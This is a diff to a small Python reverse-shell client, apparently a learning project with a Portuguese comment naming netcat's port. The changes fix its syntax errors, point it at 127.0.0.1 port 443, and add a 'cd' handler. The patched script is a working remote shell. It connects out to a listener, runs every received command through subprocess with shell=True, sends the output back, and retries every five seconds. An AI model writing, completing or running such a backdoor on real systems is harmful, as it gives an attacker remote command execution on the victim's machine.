@@ -1,15 +1,16 @@
+import os
 import socket
-from time import sleep
 import subprocess
+from time import sleep
 
-IP = "192.168.x.x"
+IP = "127.0.0.1" # 
 PORT = 443 # Ou 444, porta padrão do netcat
 
 
 def connect():
     try:
-        c = socket.socket((socket.AF_NET, socket.SOCK_STREAM))
-        C.connect((IP ,PORT))
+        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        c.connect((IP, PORT))
 
         return c
     except Exception as e:
@@ -22,7 +23,7 @@ def listen(c):
             data = c.recv(1024).decode().strip()
             if data == "/exit":
                 return
-            else
+            else:
                 cmd(c, data)
 
     except Exception as e:
@@ -31,6 +32,15 @@ def listen(c):
 
 def cmd(c, data):
     try:
+
+        if data.startswith("cd "):
+            try:
+                os.chdir(data[3:].strip())
+            except Exception as e:
+                print(f'CD function error: {e}')            
+            
+            return
+
         p = subprocess.Popen(
             data,
             shell=True,
@@ -39,9 +49,10 @@ def cmd(c, data):
             stdout=subprocess.PIPE
         )
 
-        c.send(p.stdout.read() + p.stderr.read() + "\n" )
+        output = p.stdout.read() + p.stderr.read() + b"\n"
+        c.send(output)
 
-   exception Exception as e: 
+    except Exception as e: 
         print(f'CMD function error: {e}')
 
 if __name__ == '__main__':
@@ -54,8 +65,8 @@ if __name__ == '__main__':
             else :
                 sleep(5)
 
-    exception KeybardInterrupt:
+    except KeybardInterrupt:
         print('Program stoped by the user')
 
-    exception Exception as e:
+    except Exception as e:
         print(f'Error in main function: {e}')
